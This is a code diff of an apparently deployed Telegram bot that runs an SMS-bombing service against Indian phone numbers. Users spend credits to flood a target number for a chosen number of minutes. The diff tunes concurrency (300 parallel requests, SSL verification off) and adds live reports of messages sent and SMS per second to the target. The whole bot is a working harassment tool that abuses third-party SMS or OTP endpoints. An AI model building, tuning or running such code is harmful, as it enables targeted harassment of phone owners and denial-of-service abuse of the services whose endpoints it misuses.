@@ -26,13 +26,12 @@ BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 WEBHOOK_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
 PORT        = int(os.environ.get("PORT", 8000))
 
-# ⚠️ AAPKI TELEGRAM ID
 ADMIN_ID = 8959878185  
 
-# ULTRA FAST MODE CONFIG
-CONCURRENCY     = 1000             # Ek baar me 1000 requests (Maximum Speed)
-DELAY           = 0.0              # Koi delay nahi
-REQUEST_TIMEOUT = 2.5              # 2.5 second timeout (Dead APIs ko jaldi chhod dega)
+# SAFE SPEED FOR RENDER (Crash nahi hoga)
+CONCURRENCY     = 300              
+DELAY           = 0.0              
+REQUEST_TIMEOUT = 3                
 # ============================================
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
@@ -73,7 +72,7 @@ user_sessions = load_db()
 async def get_http_session() -> aiohttp.ClientSession:
     global _http_session
     if _http_session is None or _http_session.closed:
-        connector = aiohttp.TCPConnector(limit=2000, limit_per_host=200, ssl=False, force_close=True)
+        connector = aiohttp.TCPConnector(limit=500, limit_per_host=100, ssl=False)
         timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
         _http_session = aiohttp.ClientSession(connector=connector, timeout=timeout)
     return _http_session
@@ -82,7 +81,7 @@ def is_valid_target(num: str) -> bool:
     return num.isdigit() and len(num) == 10 and num[0] in "6789"
 
 # =========================================================================
-#  APIS (Same as before)
+#  APIS
 # =========================================================================
 def build_endpoints():
     UA_D = "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
@@ -271,7 +270,6 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             await query.message.edit_text("🛑 **STOPPING...**", parse_mode="Markdown")
             
     elif query.data.startswith("credits_"):
-        # User chose how many credits to use
         mins = int(query.data.split("_")[1])
         s = user_sessions.get(str(uid))
         
@@ -280,7 +278,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             
         s["credits_to_use"] = mins
         s["state"] = "running"
-        s["running"] = True  # <--- YAHAN FIX HUA HAI (Yeh line missing thi)
+        s["running"] = True
         s["start_time"] = time.time()
         s["sent"] = 0
         
@@ -299,7 +297,7 @@ async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         
         asyncio.create_task(run_bombing(uid, s))
 
-# ================== TEXT HANDLER & BOMBING ==================
+# ================== TEXT HANDLER ==================
 async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     text = update.message.text.strip()
@@ -317,7 +315,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
     s["target"] = text
 
-    # Ask user how many credits they want to use
     keyboard = [
         [InlineKeyboardButton("1 Min (1 Credit)", callback_data="credits_1"), InlineKeyboardButton("5 Min (5 Credits)", callback_data="credits_5")],
         [InlineKeyboardButton("10 Min (10 Credits)", callback_data="credits_10"), InlineKeyboardButton("30 Min (30 Credits)", callback_data="credits_30")]
@@ -333,6 +330,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
+# ================== BOMBING LOGIC (WITH LIVE UPDATES) ==================
 async def run_bombing(uid: int, s: dict):
     target = s["target"]
     mins_to_use = s.get("credits_to_use", 1)
@@ -341,6 +339,7 @@ async def run_bombing(uid: int, s: dict):
     sent = 0
     start = time.time()
     idx = 0
+    last_report = start
     
     # Deduct credits upfront
     user = get_user(uid)
@@ -362,6 +361,25 @@ async def run_bombing(uid: int, s: dict):
             ok = await _fire_batch(batch, target)
             sent += ok
             s["sent"] = sent
+
+            # Live Progress every 10 seconds
+            now = time.time()
+            if now - last_report >= 10:
+                last_report = now
+                try:
+                    elapsed = int(now - start)
+                    speed = int(sent / elapsed) if elapsed > 0 else 0
+                    await telegram_app.bot.send_message(
+                        uid,
+                        f"📊 **Live Update**\n"
+                        f"🎯 Target: `{target}`\n"
+                        f"📨 Sent: *{sent}*\n"
+                        f"⚡ Speed: *{speed} SMS/sec*\n"
+                        f"⏱ Time: {elapsed//60}m {elapsed%60}s / {mins_to_use}m",
+                        parse_mode="Markdown"
+                    )
+                except Exception:
+                    pass
 
             if DELAY > 0:
                 await asyncio.sleep(DELAY)
